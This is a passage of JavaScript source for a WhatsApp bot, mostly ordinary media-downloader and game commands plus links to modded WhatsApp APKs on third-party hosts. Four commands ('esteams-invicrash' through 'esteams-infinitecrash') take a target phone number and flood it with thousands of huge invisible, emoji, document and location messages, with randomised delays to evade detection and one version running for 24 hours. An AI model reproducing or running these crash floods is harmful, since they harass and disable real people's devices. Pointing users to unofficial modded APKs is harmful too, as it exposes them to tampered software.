    if (!text.includes('youtu')) return replygcxlicon('⚠️ *The URL does not contain results from YouTube!*');
    XliconStickWait();

    try {
        const apiUrl1 = `${global.api}downloader/yt-video?apikey=${global.id}&url=${encodeURIComponent(text)}`;
        const apiUrl2 = `${global.api}downloader/yt-video2?apikey=${global.id}&url=${encodeURIComponent(text)}`;

        // First API request
        const response1 = await axios.get(apiUrl1);
        const hasil1 = response1.data;

        // Check if video URL is available from first API
        if (hasil1.result && hasil1.result.video) {
            const videoLink = hasil1.result.video;
            const caption = `*_DOWNLOADED BY ES_TEAMS-V1_*\n\n🎬 *Title*: _${hasil1.result.title}_\n✨ *Enjoy your video!* 🎥\n🔥 *Powered by ES_TEAMS-V1* 💻`;

            await XliconBotInc.sendMessage(m.chat, {
                video: { url: videoLink },
                caption: caption,
                thumbnail: { url: hasil1.result.thumb } // Include thumbnail if available
            }, { quoted: m });
        } else {
            // If no video URL from the first API, try the second API
            const response2 = await axios.get(apiUrl2);
            const hasil2 = response2.data;

            if (hasil2.result && hasil2.result.video) {
                const videoLink2 = hasil2.result.video;
                const caption2 = `*_DOWNLOADED BY ES_TEAMS-V1_*\n\n🎬 *Title*: _${hasil2.result.title}_\n✨ *Enjoy your video!* 🎥\n🔥 *Powered by ES_TEAMS-V1* 💻`;

                await XliconBotInc.sendMessage(m.chat, {
                    video: { url: videoLink2 },
                    caption: caption2,
                    thumbnail: { url: hasil2.result.thumb } // Include thumbnail if available
                }, { quoted: m });
            } else {
                throw new Error('❌ *No video download link found from both APIs.*');
            }
        }
    } catch (error) {
        console.error('Error in ytv2 command:', error);
        replygcxlicon('⚠️ *An error occurred while processing the video.*');
    }
}
break;

//----------------------------------------------------------------------------------------------//

				
case 'apk': {
  if (!text) return replygcxlicon(`*[❗] Please provide the APK Name you want to download.*`);
  await XliconStickWait();

  try {
    // Fetch APK data from the new API
    let apiUrl = `https://bk9.fun/download/apk?id=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);
    let data = await response.json();

    if (data.status !== true) {
      return replygcxlicon(`*[❗] No results found for the APK Name you provided.*`);
    }

    let apkData = data.BK9;

    // Ensure size is a valid string before parsing it
    let sizeMB = 0;
    if (apkData.size && typeof apkData.size === 'string') {
      sizeMB = parseFloat(apkData.size.replace(' MB', ''));
    }

    if (sizeMB > 200) {
      return await XliconBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
    }

    // Send the APK file
    await XliconBotInc.sendMessage(
      m.chat,
      {
        document: { url: apkData.dllink },
        mimetype: 'application/vnd.android.package-archive',
        fileName: apkData.name + '.apk',
        caption: `*APK Name:* ${apkData.name}\n*Last Updated:* ${apkData.lastup}\n*Package:* ${apkData.package}`,
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(error);
    return replygcxlicon(`*[❗] An error occurred. Please try again later.*`);
  }
}
break;


case 'modwa': {
  if (!isPremium) return replyprem(mess.premium);

  try {
    // Fetch mod data from the API
    let apiUrl = `${global.api}downloader/wamod?apikey=${global.id}`;
    let response = await fetch(apiUrl);
    let data = await response.json();

    if (data.status !== 200) {
      return replygcxlicon('*[❗] No results found for the mod name you provided.*');
    }

    // Define available mods
    let modsList = `
*Available WhatsApp Mods:*
1. GBWhatsApp - Download with *${prefix}modwa gbwa*
2. WhatsApp Plus - Download with *${prefix}modwa waplus*
3. OGWhatsApp - Download with *${prefix}modwa ogwa*
4. ANWhatsApp - Download with *${prefix}modwa anwa*
5. FMWhatsApp - Download with *${prefix}modwa fmwa*
6. YoWhatsApp - Download with *${prefix}modwa yowa*
7. WhatsAero - Download with *${prefix}modwa aerowa*
8. WhatsApp Gold - Download with *${prefix}modwa goldwa*
9. Karina WhatsApp - Download with *${prefix}modwa karinawa*
`;

    // Send the mod list in reply
    replygcxlicon(modsList);
  } catch (error) {
    console.error(error);
    return replygcxlicon('*[❗] An error occurred. Please try again later.*');
  }
}
break;

case 'modwa_select': {
  try {
    const modName = text.split(' ')[0]; // Extract the mod name from the command
    const modData = {
      gbwa: "https://download2444.mediafire.com/bav6mdrs41vg0s3MIHTKMTYlvAaSRpBCCbGHAQ-c-hjQplzKcqBNHV-mcPSk2IY3IZUvjwRQBqkdrNqJmf5fBuVy9H9-9haNKGWqmeDhAbAzXmn5eqH1kX8m3L_4N19o7UvWOoyjkl0vpVzcDPvQK_PnNYpJw6GM7bn_1150zMYyhaeO/hs2h2jcqw393qvd/GBWhatsApp_Pro_v17.76.apk",
      waplus: "https://download2435.mediafire.com/su3jsxy7lmigblThAiSt7XKA1VJLbh07Q80SmNkfbtP9Blt0siFMCv3fUVKMips_HyaeULLIfC2G8BGY6fxL4g8XW8sXJOQMsb-qpPwB9mYWYS_A3DmljSWK6fsNlI6VA2Pt83_F56GY42n_uDqMFFE6jElziSvgwCxZM72-1VWItfVN/lb5m60dlj1gm03t/WhatsApp_Plus_v17.76.apk",
      ogwa: "https://download2448.mediafire.com/fyip44tzdyogy3Ra0iqGKDB0NQMTEMXCsYY8Kb6TjTKo8fAAyxJdBYCfWELO6vlkoVLkdKFmHrj7hD3aOll2jY0Lnez5LLz_4ypZLhqIfhT4Oa_HJ3KIq8QEWZwGAp6ZhMoKlD3jBpgK_Kvb_OuX_n1nnOluhMfiCLwXyG5tJDdiUqi7/v2n2xs6mw831yy2/OGWhatsApp_Pro_v17.76.apk",
      anwa: "https://files.smart5hone.com/Downloads/AN_V37/redirects.php?forward=https://files.smart5hone.com/apk/anwa/ANWhatsApp_V37.apk",
      fmwa: "https://cdn.fouadmod.com/apk/10.06/FMWA10.06@FouadMOD.com.apk",
      yowa: "https://apk-download.co/V1006/WA10.06@FouadMODS.apk",
      aerowa: "https://download.aeromods.app/AeroMods/WhatsAero/BETA/V9.93/H7dhs4/A_AERO_V9.93_BETA__--com_aero--__aeromods.app__.apk",
      goldwa: "https://files.smart5hone.com/Downloads/Gold_V30/redirects.php?forward=https://files.smart5hone.com/apk/plus/WhatsApp_Gold-V30.apk",
      karinawa: "https://eu2.contabostorage.com/ea5c648569af43439f47ab26502d20f5:butterfly/Karina-Official-Whatsapp-v14-(www.nulledandroid.com).apk"
    };

    const downloadLink = modData[modName];

    if (!downloadLink) {
      return replygcxlicon(`*[❗] Invalid mod name provided.*`);
    }

    // Send the mod download link
    await XliconBotInc.sendMessage(
      m.chat,
      {
        text: `*Mod Name:* ${modName}\n*Download Link:* ${downloadLink}`
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(error);
    return replygcxlicon(`*[❗] An error occurred. Please try again later.*`);
  }
}
break;

case 'mega':{
	try {
if (!text) return replygcxlicon(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcxlicon('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcxlicon(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await XliconBotInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcxlicon(`Error: ${error.message}`);
    }
}
break
			
case 'twitter':
case 'twitterdl': {
  if (!args[0]) {
    return replygcxlicon(`📌 Example:\n*${prefix + command}* https://twitter.com/username/status/1234567890123456789`);
  }

  if (!isUrl(args[0]) || !args[0].includes('twitter.com')) {
    return replygcxlicon('❌ Invalid Twitter link!');
  }

  try {
    // Fetch data from the new Twitter downloader API
    const response = await axios.get(`https://bk9.fun/download/twitter?url=${encodeURIComponent(args[0])}`);
    
    if (!response.data || !response.data.status) {
      return replygcxlicon('❌ Unable to fetch data from the link. Please try again later.');
    }

    const { HD, username, caption, thumbnail } = response.data.BK9;

    // Prepare a response message
    const message = `
🎥 *Twitter Video Download* 🎥

👤 *Username:* ${username}
📄 *Caption:* ${caption || "No caption provided"}

🔗 *HD Quality Video Link:* 
[Click to Download](${HD})

📸 *Thumbnail:* ![Thumbnail](${thumbnail})

Click the link above to download your video!`;

    // Send the message with the video
    await replygcxlicon(message);
    
    // Send the video itself in the chat
    await XliconBotInc.sendMessage(m.chat, {
      video: { url: HD },
      mimetype: 'video/mp4',
      caption: message
    }, { quoted: m });

  } catch (error) {
    console.error(error);
    replygcxlicon('❌ *An error occurred while processing your request.*\nMake sure the link is valid and try again.');
  }
}
break;
                
case 'threads': {
  try {
    // URL of the Threads API endpoint
    const threadsApiUrl = 'https://api.nexoracle.com/downloader/threads?apikey=free_key@maher_apis&url=https://www.threads.net/t/Cujx6ryoYx6/?igshid=NTc4MTIwNjQ2YQ==';
    
    // Fetching the data from the Threads API
    let res = await fetch(threadsApiUrl);
    let apiResponse = await res.json();

    // Check if the response is valid and contains the required data
    if (apiResponse.status === 200 && apiResponse.result) {
      const { username, profile, downloadLink } = apiResponse.result;

      // Ensure both profile and download link are available
      if (profile && downloadLink) {
        // Check the file type of the downloadLink (image or video)
        const fileExtension = downloadLink.split('.').pop().toLowerCase();
        
        // If the download link is a video or image, send the corresponding type
        if (fileExtension === 'mp4' || fileExtension === 'mov') {
          // If it's a video, send the video file
          await XliconBotInc.sendMessage(m.chat, {
            video: { url: downloadLink },
            caption: `🎥 *Username:* ${username}\n📸 *Profile Image:* ${profile}`,
          }, { quoted: m });
        } else if (['jpg', 'jpeg', 'png', 'gif'].includes(fileExtension)) {
          // If it's an image, send the image
          await XliconBotInc.sendMessage(m.chat, {
            image: { url: downloadLink },
            caption: `📸 *Username:* ${username}\n📸 *Profile Image:* ${profile}`,
          }, { quoted: m });
        } else {
          // Handle if the file format is unrecognized
          return replygcxlicon('❌ *Unrecognized file format for the download link.*');
        }

      } else {
        return replygcxlicon('❌ *Missing profile or download link.*');
      }
      
    } else {
      return replygcxlicon('❌ *Failed to fetch thread content.*');
    }

  } catch (error) {
    console.error('Error fetching thread data:', error.message);
    return replygcxlicon('❌ *An error occurred while fetching thread content.*');
  }
}
break;
			    
    
  case 'fb':
    case 'facebook':
    case 'facebookvid': {
      if (!text) {
        return replygcxlicon(`📌 Please provide a Facebook video link.`);
      }
    
      try {
        // Fetch video data from the API
        const response = await fetch(`https://bk9.fun/download/videodownloader?input=${encodeURIComponent(text)}`);
        const data = await response.json();
    
        if (!data || !data.status || !data.video || !data.video.videoInfo || data.video.videoInfo.length === 0) {
          return replygcxlicon('❌ No video found or invalid response from API.');
        }
    
        // Prefer HD video, fallback to SD
        const video = data.video.videoInfo.find(v => v.quality.toLowerCase().includes('hd')) ||
                      data.video.videoInfo.find(v => v.quality.toLowerCase().includes('sd'));
    
        if (!video) {
          return replygcxlicon('❌ No HD or SD video found.');
        }
    
        const caption = `
 🎥 *Facebook Video Download* 🎥
    
📺 *Info*: ${data.video.info || "Not provided"}
⏳ *Duration*: ${data.video.duration || "Unknown"}
📹 *Quality*: ${video.quality}
💾 *Format*: ${video.format}
    
👇 *Download your video below!* 👇
    `.trim();
    
        // Send the video with the caption
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: video.downloadLink },
          caption,
        }, { quoted: m });
    
      } catch (error) {
        console.error(error);
        return replygcxlicon('❌ An error occurred while processing your request. Please try again later.');
      }
    }
    break;
                    
                             
case 'instagram': case 'insta': case 'ig': case 'igvideo': case 'igvid': {
  if (!text) {
    return replygcxlicon('❗ *You need to provide the URL of an Instagram video.*');
  }

  try {
    XliconStickWait();

    // New API URL for Instagram video download
    const apiUrl = `${global.api}downloader/insta?apikey=${global.id}&url=${encodeURIComponent(text)}`;
    const res = await fetch(apiUrl);
    const api_response = await res.json();

    // Validate API response
    if (!api_response || api_response.status !== 200 || !api_response.result || !api_response.result.video) {
      return replygcxlicon('❌ *No media found or invalid response from the API.*');
    }

    // Extract the video URL from the response
    const videoUrl = api_response.result.video;
    const cap = '*🎉 Thank you for using 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏!*';

    // Send the video message
    await XliconBotInc.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: cap
    }, { quoted: m });

  } catch (error) {
    // Handle fetch or processing errors
    return replygcxlicon(`⚠️ *An error occurred:* ${error.message}`);
  }
}
break;
        
case 'instagramimg': case 'instaimg': case 'igimage': case 'igimg': {
  if (!text) {
    return replygcxlicon('❗ *You need to provide the URL of an Instagram post.*');
  }

  try {
    XliconStickWait();

    // New API URL for Instagram image download
    const apiUrl = `https://bk9.fun/download/instagram2?url=${encodeURIComponent(text)}`;
    const res = await fetch(apiUrl);
    const api_response = await res.json();

    // Validate API response
    if (!api_response || !api_response.status || !api_response.BK9 || api_response.BK9.length === 0) {
      return replygcxlicon('❌ *No media found or invalid response from the API.*');
    }

    // Extract image URLs from the response
    const imageLinks = api_response.BK9.map(item => item.url);
    const cap = '*🎉 Thank you for using 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏!*'; // Optional caption for the images

    // Loop through each image and send them
    for (const imageUrl of imageLinks) {
      await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: cap
      }, { quoted: m });
    }

  } catch (error) {
    // Handle fetch or processing errors
    return replygcxlicon(`⚠️ *An error occurred:* ${error.message}`);
  }
}
break;
       
           
                
			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
				if (!text) return replygcxlicon(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygcxlicon('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				XliconStickWait()
				if (hasil.size_nowm) {
					await XliconBotInc.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await XliconBotInc.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
					}
				}
			}
			break
			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
				if (!text) return replygcxlicon(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygcxlicon('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				XliconStickWait()
				await XliconBotInc.sendMessage(m.chat, {
					audio: { url: hasil.music_info.url },
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: 'TikTok • ' + hasil.author.nickname,
							body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.cover,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, { quoted: m });
			}
			break
			
			// Fun Menu
			case 'dice': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				await XliconBotInc.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
			}
			break
			
			// Game Menu
			case 'slot': {
				await gameSlot(XliconBotInc, m, global.db.users)
			}
			break
			case 'casino': {
				await gameCasinoSolo(XliconBotInc, m, prefix, global.db.users)
			}
			break
			case 'robber': case 'rob': {
				await gameMerampok(m, global.db.users)
			}
			break
			case 'suitpvp': case 'suit': {
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcxlicon(`Finish your previous suit`)
				if (m.mentionedJid[0] === m.sender) return replygcxlicon(`Can't play with myself !`)
				if (!m.mentionedJid[0]) return replygcxlicon(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcxlicon(`The person you are challenging is playing suit with someone else :(`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} challenge @${m.mentionedJid[0].split`@`[0]} to play suits\n\nPlease @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
				game.suit[id] = {
					chat: replygcxlicon(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (game.suit[id]) replygcxlicon(`_Suit time is up_`)
						delete game.suit[id]
					}, 60000), poin, poin_lose, timeout
				}
			}
			break
			
			case 'esteams-invicrash': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    // Ensure that the number is provided
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"; // Clean the number to format it correctly

    // Start attack simulation
    reply(`*「 CRASH INITIATED 」*`); // Inform the user that the crash simulation has started

    // Loop to simulate the sending of invisible messages
    for (let i = 0; i < 1000; i++) {
        // Invisible message (using zero-width space)
        const invisibleMessage = "\u200B";  // Invisible space character
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: invisibleMessage }
            }
        });

        // Random delay to simulate real user behavior and avoid detection
        await new Promise(resolve => setTimeout(resolve, Math.random() * 500)); // Delay between messages
    }

    // Sending a visible message at the end
    await XliconBotInc.sendMessage(target, {
        message: {
            extendedTextMessage: { text: "Hello, how are you?" }
        }
    });

    reply(`*「 CRASH COMPLETE ✔ 」*`); // Inform that the simulation is complete
    break;
}

case 'esteams-midcrash': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    // Ensure that the number is provided
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"; // Clean the number to format it correctly

    // Start attack simulation
    reply(`*「 CRASH INITIATED 」*`); // Inform the user that the crash simulation has started

    // Function for delay inside the case
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Loop to simulate the sending of messages (invisible and other payloads)
    for (let i = 0; i < 10000; i++) { // Increase the loop for more attacks
        // Invisible message (using zero-width space)
        const invisibleMessage = "\u200B".repeat(100000); // Larger invisible space character
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: invisibleMessage }
            }
        });

        // Sending invisible image payload
        await XliconBotInc.sendMessage(target, {
            message: {
                imageMessage: {
                    url: `https://example.com/large-image.png`, // Placeholder for a large image
                    caption: ""
                }
            }
        });

        // Sending a long document as an invisible payload
        await XliconBotInc.sendMessage(target, {
            message: {
                documentMessage: {
                    fileName: `CrashPayload_${Math.random()}.pdf`,
                    mimetype: 'application/pdf',
                    fileLength: "999999999",
                    url: `https://example.com/large-payload.pdf` // Placeholder for a large document
                }
            }
        });

        // Sending invisible voice messages
        await XliconBotInc.sendMessage(target, {
            message: {
                audioMessage: {
                    url: `https://example.com/voice.mp3`, // Placeholder for a large voice message
                    mimetype: 'audio/mp4'
                }
            }
        });

        // Sending random invisible emojis
        const emojiSpam = "💥".repeat(10000); // Invisible emojis being sent without showing on screen
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: emojiSpam }
            }
        });

        // Sending random location messages (may take up more resources)
        const locationPayload = `Target Locked 💥`.repeat(1000);
        await XliconBotInc.sendMessage(target, {
            message: {
                liveLocationMessage: {
                    degreesLatitude: Math.random() * 180,
                    degreesLongitude: Math.random() * 180,
                    caption: locationPayload
                }
            }
        });

        // Random delay between messages for simulation
        await delay(Math.random() * 300); // Shorter delay to increase attack intensity
    }

    // Sending a visible message at the end
    await XliconBotInc.sendMessage(target, {
        message: {
            extendedTextMessage: { text: "Hello, how are you?" }
        }
    });

    reply(`*「 CRASH COMPLETE ✔ 」*`); // Inform that the simulation is complete
    break;
}

case 'esteams-hardcrash': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    // Ensure that the number is provided
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"; // Clean the number to format it correctly

    // Start attack simulation
    reply(`*「 CRASH INITIATED 」*`); // Inform the user that the crash simulation has started

    // Function for delay inside the case
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Attack loop with stronger payload
    for (let i = 0; i < 10000; i++) { // Increase the loop for more attacks

        // Invisible message (larger zero-width space)
        const invisibleMessage = "\u200B".repeat(100000); // Larger invisible space character
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: invisibleMessage }
            }
        });

        // Sending large image payload
        await XliconBotInc.sendMessage(target, {
            message: {
                imageMessage: {
                    url: `https://example.com/large-image.png`, // Placeholder for a large image
                    caption: "Overload Attack"
                }
            }
        });

        // Sending a huge PDF document payload
        await XliconBotInc.sendMessage(target, {
            message: {
                documentMessage: {
                    fileName: `CrashPayload_${Math.random()}.pdf`,
                    mimetype: 'application/pdf',
                    fileLength: "999999999",
                    url: `https://example.com/large-payload.pdf` // Placeholder for a large document
                }
            }
        });

        // Sending large voice message (audio overload)
        await XliconBotInc.sendMessage(target, {
            message: {
                audioMessage: {
                    url: `https://example.com/large-voice.mp3`, // Placeholder for a large voice message
                    mimetype: 'audio/mp4'
                }
            }
        });

        // Sending emojis at a massive scale
        const emojiSpam = "💥".repeat(50000); // Even larger number of invisible emojis
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: emojiSpam }
            }
        });

        // Sending an overload of location messages
        const locationPayload = `Target Locked 💥`.repeat(5000);
        await XliconBotInc.sendMessage(target, {
            message: {
                liveLocationMessage: {
                    degreesLatitude: Math.random() * 180,
                    degreesLongitude: Math.random() * 180,
                    caption: locationPayload
                }
            }
        });

        // Sending a burst of text to flood the target
        const textFlood = "⚡".repeat(10000); // Repeating lightning emojis for high load
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: textFlood }
            }
        });

        // Random delay between messages to simulate human-like behavior
        await delay(Math.random() * 100); // Much shorter delay for intense attack

        // Sending a fake contact card payload
        await XliconBotInc.sendMessage(target, {
            message: {
                contactMessage: {
                    displayName: "Attack Simulation",
                    vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:Attack Sim\nTEL:+1234567890\nEND:VCARD"
                }
            }
        });

        // Sending rapid video spams
        await XliconBotInc.sendMessage(target, {
            message: {
                videoMessage: {
                    url: `https://example.com/large-video.mp4`, // Placeholder for a large video
                    caption: "⚠️ Warning! ⚠️",
                    seconds: 999999
                }
            }
        });

        // Sending large chunks of base64 encoded data
        const base64Spam = Buffer.from("A very large payload of base64 data").toString('base64').repeat(50); // Large base64 payload
        await XliconBotInc.sendMessage(target, {
            message: {
                extendedTextMessage: { text: base64Spam }
            }
        });
    }

    // Sending a visible message at the end
    await XliconBotInc.sendMessage(target, {
        message: {
            extendedTextMessage: { text: "Hello, how are you?" }
        }
    });

    reply(`*「 CRASH COMPLETE ✔ 」*`); // Inform that the simulation is complete
    break;
}

case 'esteams-infinitecrash': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    // Ensure the number is provided
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"; // Clean the number to format it correctly

    // Start attack warning
    reply(`*「 WARNING 」*
    _This command is extremely deadly and could get you banned from WhatsApp!_
    _Proceed with caution._
    *Use this command wisely, as it will continuously send messages for 24 hours, even if WhatsApp is reinstalled!*
    _Are you sure you want to continue?_
    *Yes or No?*`);

    // Listen for the response to proceed
    // Assuming you have a way to capture Yes/No response (or you can adjust logic as needed)
    const proceed = true; // Set to true if the user confirms, otherwise false.

    if (proceed) {
        reply(`*「 CRASH INITIATED 」*`); // Inform the user the attack has started
        
        // Function for delay inside the case
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Simulating the 24-hour attack (sending messages for 24 hours continuously)
        let attackDuration = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
        let endTime = Date.now() + attackDuration;
        
        while (Date.now() < endTime) {
            // Invisible message (larger zero-width space)
            const invisibleMessage = "\u200B".repeat(100000); // Larger invisible space character
            await XliconBotInc.sendMessage(target, {
                message: {
                    extendedTextMessage: { text: invisibleMessage }
                }
            });

            // Sending a fake contact card payload
            await XliconBotInc.sendMessage(target, {
                message: {
                    contactMessage: {
                        displayName: "Attack Simulation",
                        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:Attack Sim\nTEL:+1234567890\nEND:VCARD"
                    }
                }
            });

            // Random delay between messages to avoid detection
            await delay(Math.random() * 100); // Much shorter delay for intense attack

            // Sending massive amount of emojis (to overload the message queue)
            const emojiSpam = "💥".repeat(50000); // Even larger number of invisible emojis
            await XliconBotInc.sendMessage(target, {
                message: {
                    extendedTextMessage: { text: emojiSpam }
                }
            });

            // Sending a large text flood
            const textFlood = "⚡".repeat(10000); // Repeating lightning emojis for high load
            await XliconBotInc.sendMessage(target, {
                message: {
                    extendedTextMessage: { text: textFlood }
                }
            });

            // Sending large image payloads for high data consumption
            await XliconBotInc.sendMessage(target, {
                message: {
                    imageMessage: {
                        url: `https://example.com/large-image.png`, // Placeholder for a large image
                        caption: "Overload Attack"
                    }
                }
            });

            // Random delay for human-like behavior
            await delay(Math.random() * 500); // Delay between messages
        }

        reply(`*「 CRASH COMPLETE ✔ 」*`); // Inform the user that the attack simulation is complete after 24 hours
    } else {
        reply(`*「 OPERATION ABORTED 」*`); // If user doesn't confirm, abort the attack
    }
    break;
}
			
			case 'ttc': case 'ttt': case 'tictactoe': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    // Approval check for the first player initiating the game
    let firstPlayerApproved = true; // Assume the first player is approved by default

    if (!Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && room.game.playerX === m.sender)) {
        // Check if the player is the first one to start the game
        firstPlayerApproved = await checkApprovedNumber(m.sender, reply);
        if (!firstPlayerApproved) {
            replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
            return;
        }
    }

    let TicTacToe = require('./lib/tictactoe');

    // Check if the user is already in an active game
    if (Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) {
        return replygcxlicon(`You are still in the game!\nType *${prefix}del${command}* If you want to end the session`);
    }

    let room = Object.values(game.tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true));

    if (room) {
        // If a room is found and the player is the second player joining
        if (room.o === '') {
            // Join as the second player
            room.o = m.chat;
            room.game.playerO = m.sender;
            room.state = 'PLAYING';

            let arr = room.game.render().map(v => {
                return { X: '❌', O: '⭕', 1: '1️⃣', 2: '2️⃣', 3: '3️⃣', 4: '4️⃣', 5: '5️⃣', 6: '6️⃣', 7: '7️⃣', 8: '8️⃣', 9: '9️⃣' }[v];
            });

            let str = `𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐗 𝐀𝐍𝐃 𝐎\n\nRoom ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nWaiting @${room.game.currentTurn.split('@')[0]}\n\nType *surrender* to give up and admit defeat\n\nPowered by 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇`;

            if (room.x !== room.o) {
                await XliconBotInc.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m });
            }
            await XliconBotInc.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m });

            // Send to global channel
            await XliconBotInc.sendMessage(global.wagc, { text: str, mentions: parseMention(str) });
        }
    } else {
        // Create a new room
        room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING',
            waktu: setTimeout(() => {
                if (game.tictactoe[room.id]) {
                    replygcxlicon('_Time expired, game closed. Please start a new game by typing_ *.ttt*');
                    delete game.tictactoe[room.id];
                }
            }, 300000) // 5 minutes
        };

        if (text) room.name = text;

        // Updated message with "Es Teams is waiting for second player"
